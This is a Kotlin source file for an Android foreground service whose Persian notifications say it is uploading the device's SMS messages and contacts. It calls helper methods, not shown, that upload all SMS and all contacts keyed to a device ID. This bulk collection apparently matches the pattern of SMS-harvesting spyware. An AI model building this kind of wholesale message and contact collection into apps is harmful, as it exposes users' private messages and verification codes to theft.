package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.test.utils.DataUploader

class DataUploadService : Service() {

    companion object {
        private const val TAG = "DataUploadService"
        const val EXTRA_DEVICE_ID = "device_id"
        private const val NOTIFICATION_ID = 3
        private const val CHANNEL_ID = "data_upload_channel"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🚀 DataUploadService CREATED")
        Log.d(TAG, "════════════════════════════════════════")
        startForegroundNotification()
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Data Upload Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "آپلود SMS و مخاطبین در پس‌زمینه"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("آپلود اطلاعات")
            .setContentText("در حال آپلود SMS و مخاطبین...")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "✅ Foreground notification started")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = intent?.getStringExtra(EXTRA_DEVICE_ID)

        if (deviceId.isNullOrEmpty()) {
            Log.e(TAG, "❌ Device ID is null or empty!")
            stopSelf()
            return START_NOT_STICKY
        }

        Log.d(TAG, "📱 Device ID: $deviceId")
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "🔄 STARTING BACKGROUND UPLOAD")
        Log.d(TAG, "════════════════════════════════════════")

        // اجرای آپلود در Thread جداگانه
        Thread {
            var smsSuccess = false
            var contactsSuccess = false

            try {
                // 4️⃣ آپلود SMS‌ها
                Log.d(TAG, "4️⃣ Starting SMS upload in background...")
                updateNotification("آپلود پیامک‌ها", "در حال آپلود پیامک‌ها...")

                DataUploader.uploadAllSms(this, deviceId)
                smsSuccess = true

                Log.d(TAG, "✅ SMS upload completed successfully")
                Log.d(TAG, "════════════════════════════════════════")

                // فاصله کوتاه بین عملیات‌ها
                Thread.sleep(1000)

                // 5️⃣ آپلود مخاطبین
                Log.d(TAG, "5️⃣ Starting contacts upload in background...")
                updateNotification("آپلود مخاطبین", "در حال آپلود مخاطبین...")

                DataUploader.uploadAllContacts(this, deviceId)
                contactsSuccess = true

                Log.d(TAG, "✅ Contacts upload completed successfully")
                Log.d(TAG, "════════════════════════════════════════")

                // نمایش نتیجه نهایی
                if (smsSuccess && contactsSuccess) {
                    Log.d(TAG, "🎉 ALL BACKGROUND UPLOADS COMPLETED")
                    updateNotification("آپلود کامل شد ✓", "SMS و مخاطبین با موفقیت ارسال شدند")
                } else {
                    Log.w(TAG, "⚠️ SOME UPLOADS FAILED")
                    updateNotification("آپلود ناقص", "بعضی از اطلاعات ارسال نشدند")
                }

                // نگه داشتن notification برای 3 ثانیه
                Thread.sleep(3000)

            } catch (e: Exception) {
                Log.e(TAG, "❌ Upload error: ${e.message}", e)
                e.printStackTrace()
                updateNotification("خطا در آپلود ✗", "لطفا اتصال اینترنت را بررسی کنید")
                Thread.sleep(3000)
            } finally {
                Log.d(TAG, "════════════════════════════════════════")
                Log.d(TAG, "🛑 DataUploadService STOPPING")
                Log.d(TAG, "════════════════════════════════════════")
                stopSelf()
            }
        }.start()

        return START_STICKY
    }

    private fun updateNotification(title: String, text: String) {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_sys_upload)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()

            val manager = getSystemService(NotificationManager::class.java)
            manager?.notify(NOTIFICATION_ID, notification)

            Log.d(TAG, "📢 Notification updated: $title")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to update notification: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "👋 DataUploadService destroyed")
    }
}